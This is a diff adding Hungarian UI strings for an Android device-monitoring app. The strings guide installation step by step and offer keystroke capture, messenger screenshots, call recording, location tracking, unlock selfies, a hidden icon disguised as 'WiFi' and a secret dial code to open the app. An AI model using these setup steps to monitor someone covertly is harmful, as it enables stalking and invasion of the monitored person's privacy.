@@ -1,0 +1,330 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="abc_action_bar_home_description">Ugrás a főoldalra</string>
+    <string name="abc_action_bar_up_description">Felfelé mozgatás</string>
+    <string name="abc_action_menu_overflow_description">További lehetőségek</string>
+    <string name="abc_action_mode_done">Kész</string>
+    <string name="abc_activity_chooser_view_see_all">Összes megtekintése</string>
+    <string name="abc_activitychooserview_choose_application">Válasszon ki egy alkalmazást</string>
+    <string name="abc_capital_off">KI</string>
+    <string name="abc_capital_on">BE</string>
+    <string name="abc_menu_alt_shortcut_label">Alt+</string>
+    <string name="abc_menu_ctrl_shortcut_label">Ctrl+</string>
+    <string name="abc_menu_delete_shortcut_label">Delete</string>
+    <string name="abc_menu_enter_shortcut_label">Enter</string>
+    <string name="abc_menu_function_shortcut_label">Function+</string>
+    <string name="abc_menu_meta_shortcut_label">Meta+</string>
+    <string name="abc_menu_shift_shortcut_label">Shift+</string>
+    <string name="abc_menu_space_shortcut_label">Szóköz</string>
+    <string name="abc_menu_sym_shortcut_label">Sym+</string>
+    <string name="abc_prepend_shortcut_label">Menu+</string>
+    <string name="abc_search_hint">Keresés…</string>
+    <string name="abc_searchview_description_clear">Lekérdezés törlése</string>
+    <string name="abc_searchview_description_query">Keresési lekérdezés</string>
+    <string name="abc_searchview_description_search">Keresés</string>
+    <string name="abc_searchview_description_submit">Lekérdezés küldése</string>
+    <string name="abc_searchview_description_voice">Hangalapú keresés</string>
+    <string name="abc_shareactionprovider_share_with">Megosztás a következővel:</string>
+    <string name="abc_shareactionprovider_share_with_application">Megosztás a következő alkalmazással: %s</string>
+    <string name="abc_toolbar_collapse_description">Összecsukás</string>
+    <string name="app_log_name">Apps</string>
+    <string name="check">Távolítsa el a régi verziót itt</string>
+    <string name="date_format_full">d MMM yyyy</string>
+    <string name="date_format_short">d MMM</string>
+    <string name="dialog_allow_unknown_source">Az alkalmazás frissítéséhez engedélyezze az „Ismeretlen alkalmazások telepítése” lehetőséget.</string>
+    <string name="dialog_battery_optim">Az alkalmazás megfelelő működéséhez kapcsolja ki az Az akkumulátor használatának optimalizálása lehetőséget</string>
+    <string name="dialog_battery_optim_on">Az akkumulátor optimalizálása továbbra is engedélyezve van!</string>
+    <string name="dialog_battery_optim_set">":
+ - Cserélje a \"Nem optimalizált\" elemet az \"Összes alkalmazás\" elemre
+ - Keresse meg és kapcsolja ki a \"%1$s\" alkalmazást
+ - Érintse meg a \"Vissza\" gombot"</string>
+    <string name="dialog_no">Nem</string>
+    <string name="dialog_ok">OK</string>
+    <string name="dialog_perm_accessibility">Kérjük, engedélyezze az alkalmazás akadálymentességét</string>
+    <string name="dialog_perm_accessibility_on">Az alkalmazások hozzáférhetőségi szolgáltatása továbbra is le van tiltva!</string>
+    <string name="dialog_perm_app">"Kérjük, aktiválja az összes alkalmazás engedélyét:
+ - Nyissa meg az \"Engedélyek\" elemet
+ - Aktiválja az összes engedélyt"</string>
+    <string name="dialog_perm_app_off">Néhány alkalmazás engedély továbbra is le van tiltva!</string>
+    <string name="dialog_perm_notif">Kérjük, tiltsa le az alkalmazás értesítéseit</string>
+    <string name="dialog_perm_notif_on">Az alkalmazások értesítései továbbra is engedélyezve vannak!</string>
+    <string name="dialog_perm_overlay">A képernyőképek és a szelfik kinyitásáért kérjük, aktiválja az \"Átfedés\" engedélyt</string>
+    <string name="dialog_perm_overlay_off">Az \"Átfedés\" engedély továbbra is le van tiltva!</string>
+    <string name="dialog_perm_read_notif">Kérjük, engedje meg, hogy %1$s elolvassa az értesítéseket</string>
+    <string name="dialog_perm_read_notif_off">Az olvasási értesítésekhez való hozzáférés továbbra is le van tiltva!</string>
+    <string name="dialog_perm_scr">"Kérjük, hagyja, hogy %1$s képernyőképeket készíthessen:
+ - Engedélyezze a \"Ne mutassa újra\" elemet
+ - Koppintson a \"Indítás most\" gombra"</string>
+    <string name="dialog_perm_scr_off">A képernyő rögzítése továbbra is le van tiltva!</string>
+    <string name="dialog_perm_usage">"A képernyőképeinek aktiválásához kérjük, aktiválja az \"Adathozzáférés\" engedélyt:
+ - Keresse meg és koppintson a \"%1$s\" alkalmazásra
+ - Engedélyezze a hozzáérést
+ - Koppintson kétszer a \"Vissza\" gombra"</string>
+    <string name="dialog_perm_usage_off">A \"Használati adatokhoz való hozzáférés\" engedély továbbra is le van tiltva!</string>
+    <string name="dialog_pin_current">Aktuális PIN-kód</string>
+    <string name="dialog_pin_retype">Írja be újra a PIN-kódot</string>
+    <string name="dialog_pin_specify">Új PIN</string>
+    <string name="dialog_run_app">Rejtett alkalmazás megnyitása – tárcsázzon:</string>
+    <string name="dialog_run_app_sticker">A rejtett alkalmazás megnyitásához használja a \"Matrica\" modult</string>
+    <string name="dialog_uninstall_ask">Távolítsa el a Monitor programot?</string>
+    <string name="dialog_update">Frissítés</string>
+    <string name="dialog_wait">Kérjük, várjon…</string>
+    <string name="dialog_yes">Igen</string>
+    <string name="email_msg_alarm">Az előfizetés %1$s után lejár.</string>
+    <string name="email_msg_alarm_renew">"
+Kérjük, újítsa meg előfizetését."</string>
+    <string name="email_msg_alarm_stop">Az előfizetés lejárt.</string>
+    <string name="email_msg_alarm_stop_logs">A fizetett jelentések el lesznek vetve – kivéve, ha előfizetést kezdeményez.</string>
+    <string name="event_count">Szám</string>
+    <string name="event_name">Esemény</string>
+    <string name="general_password">Kérjük, adja meg PIN-kódját</string>
+    <string name="global_settings_name">Beállítások</string>
+    <string name="hint_change_pin_new">Írja be az új PIN-kódot</string>
+    <string name="hint_enter_pin">Írja be a PIN-kódot</string>
+    <string name="hint_sms_hiden">[Rejtett]</string>
+    <string name="ignore">Ugorja át ezt a lépést</string>
+    <string name="im_log_name">M</string>
+    <string name="inst_accessibility_activate_action">SZOLGÁLTATÁS BEÁLLÍTÁSA</string>
+    <string name="inst_accessibility_browsers_list">Chrome, Opera, Firefox, Samsung, Mint, ASUS</string>
+    <string name="inst_accessibility_caption">Válassza a nyomon követhető további tevékenységek lehetőséget</string>
+    <string name="inst_accessibility_chats">Csevegő üzenetek</string>
+    <string name="inst_accessibility_chats_list">WhatsApp, Facebook Messenger, Viber, Hangouts</string>
+    <string name="inst_accessibility_hint">"A képernyőtartalom eléréséhez aktiválnia kell az akadálymentesség-szolgáltatást:
+Válassza a '%1$s' alkalmazást a listából, és engedélyezze azt. Térjen vissza erre az oldalra. (A rendszer bezárhatja az alkalmazást ebben a pillanatban)"</string>
+    <string name="inst_accessibility_sites">Webhelyek előzményei</string>
+    <string name="inst_call_recording">Telefonhívások felvételei</string>
+    <string name="inst_chat_recording">Csevegési hívások felvételei</string>
+    <string name="inst_chose_device_type">Kérjük, válassza ki az eszköz típusát</string>
+    <string name="inst_enable_location_access">"Az alkalmazás hozzáférést igényel a következő helyhez:\\n\\n1. Keresse meg és koppintson az \\'Engedélyek\\' beállításra.\\n2. Keresse meg és koppintson a \\\"Helyzet\\\" beállításra.\\n3. Engedélyezés: \\'Mindig engedélyezés\\'"</string>
+    <string name="inst_finish_action">A telepítés befejezése</string>
+    <string name="inst_finish_caption">A konfiguráció befejeződött</string>
+    <string name="inst_finish_hint">"Telepítés befejezve!
+Lásd a fiók naplóit."</string>
+    <string name="inst_hello_cancel">A telepítés megszakítása</string>
+    <string name="inst_hello_caption">Az eszköz megfigyelhetővé tétele</string>
+    <string name="inst_hello_hint">Ha akarja figyelni ezt az eszközt, akkor minden konfigurációs lépést meg kell tennie. Győződjön meg arról, hogy van egy regisztrált fiókja, és nyomja meg a KÖVETKEZŐ gombot.</string>
+    <string name="inst_license_caption">Végfelhasználói licencszerződés</string>
+    <string name="inst_log_select_all">Minden tevékenység</string>
+    <string name="inst_log_select_apps">Apps</string>
+    <string name="inst_log_select_calendar">Naptár</string>
+    <string name="inst_log_select_calls">Hívásnaplók</string>
+    <string name="inst_log_select_caption">Az eszköz tevékenységei, amelyek nyomon követhetők</string>
+    <string name="inst_log_select_contacts">Kapcsolatok</string>
+    <string name="inst_log_select_gallery">Galéria</string>
+    <string name="inst_log_select_hint">Ha bizonyos opciókat nem jelöl meg, akkor távolról nem tudja bekapcsolni őket. Szüksége lesz fizikai hozzáférésre egy eszközhöz.</string>
+    <string name="inst_log_select_location">Elhelyezkedés</string>
+    <string name="inst_log_select_sms">SMS/MMS</string>
+    <string name="inst_log_select_system">Rendszer események</string>
+    <string name="inst_log_select_system_hint">(SIM, akkumulátor, hálózati információk)</string>
+    <string name="inst_log_select_unlock">Fotó a telefon kinyitásakor</string>
+    <string name="inst_log_typed_text">Gépelt szöveg</string>
+    <string name="inst_login_activate">Aktiválás</string>
+    <string name="inst_login_caption">Kérjük, adja meg a hitelesítő adatait</string>
+    <string name="inst_login_forgot_password">Elfelejtette a jelszavát?</string>
+    <string name="inst_login_hint_email">Írja be az e-mailt</string>
+    <string name="inst_login_hint_password">Írd be a jelszót</string>
+    <string name="inst_old_version_found">A lehetséges hibák elkerülése érdekében távolítsa el a következő régi verziókat:</string>
+    <string name="inst_pin_caption">Állítsa be a PIN-kódot</string>
+    <string name="inst_pin_change">Cserélje ki a PIN-kódot</string>
+    <string name="inst_pin_change_hint">PIN</string>
+    <string name="inst_pin_change_icon">Az Android korlátozza az alkalmazásikonok elrejtését. Az alkalmazás a \"WiFi\" ikon alatt jelenik meg a készüléken.</string>
+    <string name="inst_pin_hide_app">Alkalmazásikon elrejtése</string>
+    <string name="inst_pin_hint">A alkalmazás elindítható a ***%1$s### tárcsázásával</string>
+    <string name="inst_pin_turn_on">Védje az alkalmazást PIN-kóddal</string>
+    <string name="inst_rec_warning">Előfordulhat, hogy egyes Android-telefonok a hívásokat nem megfelelően rögzítik</string>
+    <string name="inst_requiremens_a11y">Kisegítő lehetőségek szolgáltatás</string>
+    <string name="inst_requiremens_a11y_hint">Kiegészítő szolgáltatásokra van szükség a kiterjesztett figyelési funkciók biztosításához.</string>
+    <string name="inst_requiremens_a11y_instruction">"1. Koppintson a Telepített (letöltött) szolgáltatások elemre.
+ 2. Koppintson a '%1$s' elemre.
+ 3. Kapcsolja be a kapcsolót, és koppintson az Engedélyezés gombra.
+ 4. Érintse meg a rendszer VISSZA gombot, amíg vissza nem tér erre az oldalra."</string>
+    <string name="inst_requiremens_a11y_instruction_14">"
+
+ Ha a szolgáltatás aktiválása le van tiltva, nyissa meg a Beállítások>Alkalmazások>'%1$s' menüpontot, keresse meg a \"Korlátozott beállítások engedélyezése\" lehetőséget, és kapcsolja be. Ha nincs a beállításokban, kattintson a jobb felső sarokban lévő 3 pontra, majd kapcsolja be, majd ismételje meg a szolgáltatás aktiválását."</string>
+    <string name="inst_requiremens_a11y_instruction_header">Az akadálymentesség-szolgáltatás aktiválása:</string>
+    <string name="inst_requiremens_basic">Alapvető engedélyek</string>
+    <string name="inst_requiremens_basic_hint">Az alkalmazás hozzáférést igényel a tároláshoz, a telefon beállításaihoz, a hívásnaplókhoz és a névjegyekhez.</string>
+    <string name="inst_requiremens_basic_instruction">"1. Keresse meg és koppintson az 'Engedélyek' beállításra.
+
+2. Engedélyezze ezeket:
+\u0009- Kapcsolatok
+\u0009- Telefon
+\u0009- Tárolás
+
+3. Érintse meg a rendszer VISSZA gombot, amíg vissza nem tér erre az oldalra."</string>
+    <string name="inst_requiremens_basic_instruction_26">"1. Keresse meg és koppintson az 'Engedélyek' beállításra.
+
+2. Engedélyezze ezeket:
+\u0009- Híváslista
+\u0009- Kapcsolatok
+\u0009- Telefon
+\u0009- Tárolás
+
+3. Érintse meg a rendszer VISSZA gombot, amíg vissza nem tér erre az oldalra."</string>
+    <string name="inst_requiremens_basic_instruction_header">Engedélyek engedélyezése:</string>
+    <string name="inst_requiremens_battery">Az akkumulátor optimalizálása letiltása</string>
+    <string name="inst_requiremens_battery_hint">Hagyja, hogy az alkalmazás mindig működjön a háttérben (az akkumulátor optimalizálása KI), hogy megakadályozza az alkalmazás leállását az akkumulátor megtakarítása miatt</string>
+    <string name="inst_requiremens_caption">Alkalmazás követelmények</string>
+    <string name="inst_requiremens_everything_ready">Majdnem kész! Még néhány lépés!</string>
+    <string name="inst_requiremens_files_access_header">A tárhelyhez való hozzáférés engedélyezése:</string>
+    <string name="inst_requiremens_files_access_instruction">1. Görgessen a listában, amíg meg nem jelenik a <b>"'%1$s'"</b>" alkalmazás.
+
+2. "<b>Kapcsolja be</b>" kapcsolót az engedély megadásához.
+
+3. Érintse meg a rendszer "<b>VISSZA</b> gombját, amíg vissza nem tér erre az oldalra.</string>
+    <string name="inst_requiremens_hint">Az alkalmazás megfelelő működéséhez engedélyezze az összes felsorolt lehetőséget</string>
+    <string name="inst_requiremens_notifications">Az alkalmazás-értesítések letiltása</string>
+    <string name="inst_requiremens_notifications_access">Hozzáférés az értesítésekhez</string>
+    <string name="inst_requiremens_notifications_access_hint">Ez az engedély lehetővé teszi az értesítések olvasását.</string>
+    <string name="inst_requiremens_notifications_access_instruction">1. Görgessen a listában, amíg meg nem jelenik a <b>"'%1$s'"</b>" alkalmazás. 
+
+2. "<b>Kapcsolja be a</b>" kapcsolót az engedély megadásához. 
+
+3. "<b>Érintse meg a</b> <b>Engedélyezés</b>" elemet. 
+
+4. Érintse meg a rendszer "<b>VISSZA</b> gombját, amíg vissza nem tér erre az oldalra.</string>
+    <string name="inst_requiremens_notifications_access_instruction_header">Az értesítésekhez való hozzáférés engedélyezése:</string>
+    <string name="inst_requiremens_notifications_hint">Az alkalmazás értesítéseit ki kell kapcsolni, mivel ezek túl zavaróak lehetnek.</string>
+    <string name="inst_requiremens_notifications_instruction">"1. Keresse meg és koppintson az 'Értesítések' beállításra.
+
+2. Kapcsolja "<b>KI </b>" a főkapcsolót.
+
+3. Érintse meg a rendszer "<b>VISSZA</b> gombot, amíg vissza nem tér erre az oldalra.</string>
+    <string name="inst_requiremens_notifications_instruction_26">1. Kapcsolja <b>KI</b>" az 'Értesítések megjelenítése' kapcsolót.
+
+2. Érintse meg a rendszer "<b>VISSZA</b> gombot, hogy visszatérjen erre az oldalra.</string>
+    <string name="inst_requiremens_notifications_instruction_header">Az értesítések letiltása az alkalmazásból:</string>
+    <string name="inst_requiremens_overlay">Átfedés engedélyezése</string>
+    <string name="inst_requiremens_overlay_hint">Az alkalmazásnak képesnek kell lennie arra, hogy más alkalmazásokot átfedje.</string>
+    <string name="inst_requiremens_usage">Hozzáférés a használathoz</string>
+    <string name="inst_requiremens_usage_hint">Ez az engedély lehetővé teszi más alkalmazások tevékenységének nyomon követését.</string>
+    <string name="inst_requiremens_usage_instruction">1. Görgessen a listán, amíg meg nem jelenik a <b>"'%1$s'"</b>" alkalmazás.
+
+2. "<b>Koppintson az</b>" alkalmazásra.
+
+3. "<b>Kapcsolja be</b>" a kapcsolót az engedély megadásához.
+
+4. Érintse meg a rendszer "<b>VISSZA</b> gombot, amíg vissza nem tér erre az oldalra.</string>
+    <string name="inst_requiremens_usage_instruction_header">A hozzáférés engedélyezése:</string>
+    <string name="inst_screenshots_caption">Milyen típusú képernyőképeket szeretne rögzíteni?</string>
+    <string name="inst_screenshots_hint">"Engedélyeznie kell, hogy az alkalmazás képernyőképeket készítsen jövőbeli megerősítések nélkül. Állítsa be az 'Újra nem jelenjen meg' jelölőnégyzetet az engedélykérelmet tartalmazó párbeszédpanelen, és nyomja meg az INDÍTÁS MOST gombot."</string>
+    <string name="inst_screenshots_im">Messengerek</string>
+    <string name="inst_screenshots_sms">SMS/MMS</string>
+    <string name="inst_screenshots_timer">Időzített, a jelenlegi tevékenység</string>
+    <string name="inst_screenshots_title">Képernyőképek:</string>
+    <string name="inst_screenshots_web">Böngészők</string>
+    <string name="inst_type_caption">Kérjük, erősítse meg, hogy ezt az alkalmazást megfelelő módon fogja használni</string>
+    <string name="inst_type_confirmation">Megerősítem, hogy az eszköz felhasználóját tájékoztatták a figyelő szoftverről, és kifejezetten egyetértek velük</string>
+    <string name="inst_type_employee">Munkavállaló készüléke</string>
+    <string name="inst_type_intention">Ezt a szoftvert fogom használni a következők figyelésére:</string>
+    <string name="inst_type_kids">A gyerekem készüléke</string>
+    <string name="inst_type_own">Saját készülékem</string>
+    <string name="license_accept">Elfogadom</string>
+    <string name="license_read">Elolvastam és megértettem a feltételeket</string>
+    <string name="license_text"><b>1.</b>" YTudja, hogy ez a szoftver képes rögzíteni, tárolni és továbbítani az eszközhasználattal és felhasználói tevékenységeivel kapcsolatos információkat. 
+ 
+"<b>2.</b>" Ezt a szoftvert csak a következő feltételekkel szabad használni: 
+Ezt a szoftvert olyan eszközön használja, amelyet saját és személyesen használ; 
+Önnek kifejezett írásbeli hozzájárulása van a megfigyelt eszköz tulajdonosának és minden felhasználójának; 
+Ön a megfigyelt eszköz felhasználójának törvényes gyámja; 
+ 
+"<b>3.</b> Ismeri és betartja azokat a törvényeket és rendeleteket, amelyek az ön joghatósága, bizalmas kezelése és az ilyen megfigyelő szoftverek használatát érintik. A szoftver telepítéséért vagy használatáért teljes felelősséget vállal. A szoftver fejlesztői, eladói vagy forgalmazói nem tehetők felelőssé a jogsértésekért vagy következményekért, amelyek a szoftver telepítéséből vagy használatából származnak.</string>
+    <string name="log_files_name">Galéria</string>
+    <string name="log_name_audio">Hang</string>
+    <string name="log_name_file">Fájl</string>
+    <string name="log_name_gif">Gif</string>
+    <string name="log_name_image">Kép</string>
+    <string name="log_name_sticker">Matrica</string>
+    <string name="log_name_video">Videó</string>
+    <string name="menu_change_email">E-mail beállítások módosítása</string>
+    <string name="menu_change_pin">Az alkalmazás PIN-kódja módosítása</string>
+    <string name="menu_check_app_state">Ellenőrizze az alkalmazás engedélyét</string>
+    <string name="menu_check_update">Frissítések keresése</string>
+    <string name="menu_clear">Törölje a helyi naplókat</string>
+    <string name="menu_close">Bezárás</string>
+    <string name="menu_disable_pin_protection">Kapcsolja ki a PIN-kód védelmet</string>
+    <string name="menu_enable_pin_protection">PIN-kódvédelem engedélyezése</string>
+    <string name="menu_hide_icon">%1$s ikon elrejtése</string>
+    <string name="menu_reset_app_perm">Alkalmazásengedélyek visszaállítása</string>
+    <string name="menu_reset_license">Alaphelyzet visszaállítása</string>
+    <string name="menu_select_source">Hangforrás módosítása</string>
+    <string name="menu_show_icon">%1$s ikon megjelenítése</string>
+    <string name="menu_uninstall">Eltávolítás</string>
+    <string name="module_calendar">Naptári események</string>
+    <string name="module_calls">Hívások</string>
+    <string name="module_contacts">Kapcsolatok</string>
+    <string name="module_location">Elhelyezkedés</string>
+    <string name="module_mms">MMS</string>
+    <string name="module_photo">Szelfik kinyitása</string>
+    <string name="module_screen_shot">Képernyőképek</string>
+    <string name="module_sim">SIM-kártya cseréje</string>
+    <string name="module_sms">SMS</string>
+    <string name="module_web">Látogatott webhelyek</string>
+    <string name="next">következő</string>
+    <string name="search_menu_title">Keresés</string>
+    <string name="skype_call">KICSENG</string>
+    <string name="skype_call_cancel">Bezárás</string>
+    <string name="skype_call_conn">KAPCSOLÓDÁS</string>
+    <string name="skype_call_end">Hívás befejezése</string>
+    <string name="skype_start">"Hangüzenet lejátszása, "</string>
+    <string name="skype_stop">Hangüzenet szüneteltetése</string>
+    <string name="status_Version">Alkalmazás verziója:</string>
+    <string name="status_activated">Aktiválás</string>
+    <string name="status_bar_notification_info_overflow">999+</string>
+    <string name="status_internet_connection">Nincs internetkapcsolat</string>
+    <string name="status_last_send">Utolsó feltöltés:</string>
+    <string name="status_last_sync">Utolsó kapcsolat:</string>
+    <string name="status_memory_usage">Memóriahasználat</string>
+    <string name="status_monitor_disabled">A Monitor le van tiltva</string>
+    <string name="status_monitor_enabled">A Monitor engedélyezve van</string>
+    <string name="status_record">Felvétel</string>
+    <string name="status_send_data_period">Adatok feltöltési periódusa</string>
+    <string name="status_server_connected">Csatlakoztatva</string>
+    <string name="status_valid">érvényes eddig</string>
+    <string name="status_wifi">csak Wi-Fi</string>
+    <string name="telegram_date_format_full">yyyy. MMM d.</string>
+    <string name="telegram_date_format_short">MMM d.</string>
+    <string name="telegram_got">Beérkezett ma</string>
+    <string name="telegram_pause">Szünet</string>
+    <string name="telegram_sent">Elküldve ma</string>
+    <string name="telegram_video">Videó</string>
+    <string name="telegram_viewed">alkalommal megtekintve</string>
+    <string name="telegram_voice">Hangüzenet</string>
+    <string name="text_log_name">Gépelt szöveg</string>
+    <string name="time_day">d.</string>
+    <string name="time_hrs">h.</string>
+    <string name="time_min">m.</string>
+    <string name="time_sec">s.</string>
+    <string name="title_activity_installer">Telepítő</string>
+    <string name="toast_digit_pin">A PIN-kódnak csak számjegyeket kell tartalmaznia</string>
+    <string name="toast_empty_email">Adja meg a fiók e-mail címét</string>
+    <string name="toast_empty_password">Adja meg a fiók jelszavát</string>
+    <string name="toast_empty_pin">Adja meg az alkalmazás PIN-kódját</string>
+    <string name="toast_error_activation">Aktiválási hiba</string>
+    <string name="toast_hide_icon">A %1$s ikon az alkalmazás bezárása után el lesz rejtve.</string>
+    <string name="toast_length_pin">A PIN-kódnak csak 4 számjegyből kell állnia</string>
+    <string name="toast_license_limit">engedélyhiba.</string>
+    <string name="toast_license_locked">engedély zárva.</string>
+    <string name="toast_logs_cleared">A helyi naplók sikeresen törlődtek</string>
+    <string name="toast_no_inet">Kérjük, ellenőrizze az internet-kapcsolatot</string>
+    <string name="toast_not_same_pin">A PIN-kódok nem egyeznek</string>
+    <string name="toast_pin_changed">A PIN-kód sikeresen megváltozott</string>
+    <string name="toast_server_not_available">A szerver nem érhető el. Ellenőrizze az internet-kapcsolatot, vagy próbálkozzon később újra.</string>
+    <string name="toast_show_icon">A %1$s ikon az alkalmazás bezárása után látható lesz.</string>
+    <string name="toast_unkn_err">ismeretlen hiba:</string>
+    <string name="toast_wrong_account_or_password">Rossz fiók e-mail vagy jelszó.</string>
+    <string name="toast_wrong_pin">Helytelen PIN-kód</string>
+    <string name="update_current_version">Aktuális verzió: %1$s</string>
+    <string name="update_new_version">Új verzió: %1$s</string>
+    <string name="update_status_error_disable_link">A frissítési link nem érhető el. Kérjük, próbálja újra később</string>
+    <string name="update_status_error_disable_server">A szerver nem érhető el. Ellenőrizze az internetkapcsolatát</string>
+    <string name="update_status_error_download">Hiba a frissítések betöltésekor</string>
+    <string name="update_status_ok_check_link">A frissítési link ellenőrzése</string>
+    <string name="update_status_ok_check_server">A kiszolgálóhoz való hozzáférés ellenőrzése.</string>
+    <string name="update_status_ok_download_update">Frissítések letöltése…</string>
+    <string name="update_status_ok_install">Frissítések telepítése…</string>
+    <string name="viber_change">Szerkesztés</string>
+    <string name="widget_enter_note">Írja be a szöveget</string>
+    <string name="widget_hint">Koppintson a szöveg beviteléhez</string>
+    <string name="widget_name">Matrica</string>
+</resources>
